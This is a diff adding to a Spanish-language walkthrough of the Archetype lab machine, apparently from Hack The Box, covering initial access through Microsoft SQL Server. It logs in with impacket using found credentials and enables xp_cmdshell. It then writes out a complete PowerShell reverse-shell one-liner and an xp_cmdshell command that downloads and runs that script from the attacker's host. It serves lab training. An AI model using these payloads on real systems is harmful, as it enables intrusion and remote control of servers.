@@ -167,5 +167,84 @@ Leemos el archivo encontrado
 mssqlclient.py
 
 ```bash
-"mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth"
+"──(pro㉿pro)-[/opt]
+└─$ /usr/bin/python3 /opt/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth"                                                          2 ⨯
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL> 
 ```
+Conseguimos acceso desde una nueva terminal con el uso de la herramienta mssqlclient.py de IMPACKETS, y proporcionando la Contraseña encontrada anteriormente en el archivo descargado y el usuario encontrado.
+Usamos el siguiente comando para saber si tenemos los privilegios como administrador de la base de datos, y vemos que SI
+```bash
+"SQL> SELECT IS_SRVROLEMEMBER('sysadmin')    "
+             
+----------   
+          1   
+```
+Uso de XP_CMDSHELL para ejecutar comandos, pero primero hay que configurarlo para poder usarlo.
+```bash
+"SQL> EXEC sp_configure 'Show Advanced Options', 1;  "
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+
+"SQL> reconfigure;  "
+
+"SQL> sp_configure;  "
+name                                      minimum       maximum   config_value     run_value   
+-----------------------------------   -----------   -----------   ------------   -----------   
+xp_cmdshell                                     0             1              1             1 
+
+SQL> EXEC sp_configure 'xp_cmdshell', 1 reconfigure;
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+```
+Ejecutando Comandos desde el servicio de MYSQL con la opcion XP_CMDSHELL, habiendola configurado previamente.
+```bash
+"SQL> xp_cmdshell "whoami"  "
+output                                                                             
+--------------------------------------------------------------------------------   
+archetype\sql_svc                                                                  
+NULL                                                                               
+SQL> 
+```
+Ahora que sabemos que podemos ejecutar comandos vamos a postear un servidor que aloje un archivito que nos descargamos para apuntar a el desde la maquina victima y que cuando se ejecute, nos lance una reverse_shell a nuestro equipo en el cual estaremos escuchando con netcat para recibir la conexion entrante.
+
+Empezamos creando el archivo malicioso:
+```bash
+$client = New-Object System.Net.Sockets.TCPClient("CAMBIAR POR NUESTRA IP ATACANTE",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyt e.Length);$stream.Flush()};$client.Close()
+```
+una vez ya esta creado, montamos un servidor en python3 para postearlo:
+```bash
+"python3 -m http.server 80   "
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+Abrimos otra terminal y nos ponemos a la escucha en el puerto 443 Indicado en el archivo malicioso
+```bash
+"nc -lvnp 443  "
+listening on [any] 443 ...
+```
+Ejecutamos un comando a nivel de systema desde MYSQL con la opcion ya configurada XP_CMDSHELL
+```bash
+xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.54/shell.ps1\");"
+``` 
+Recibimos la conexion en nuestro server:
+```bash
+"python3 -m http.server 80   "
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.27 - - [11/May/2021 16:47:12] "GET /shell.ps1 HTTP/1.1" 200 -
+```
+```bash
+listening on [any] 443 ...
+connect to [10.10.16.54] from (UNKNOWN) [10.10.10.27] 49688
+"whoami "
+sql_svc
+```
+Hasta aqui seria el Acceso Inicial.
+Posteriormente habria que Escalar Privilegios hasta el usuario administrador.
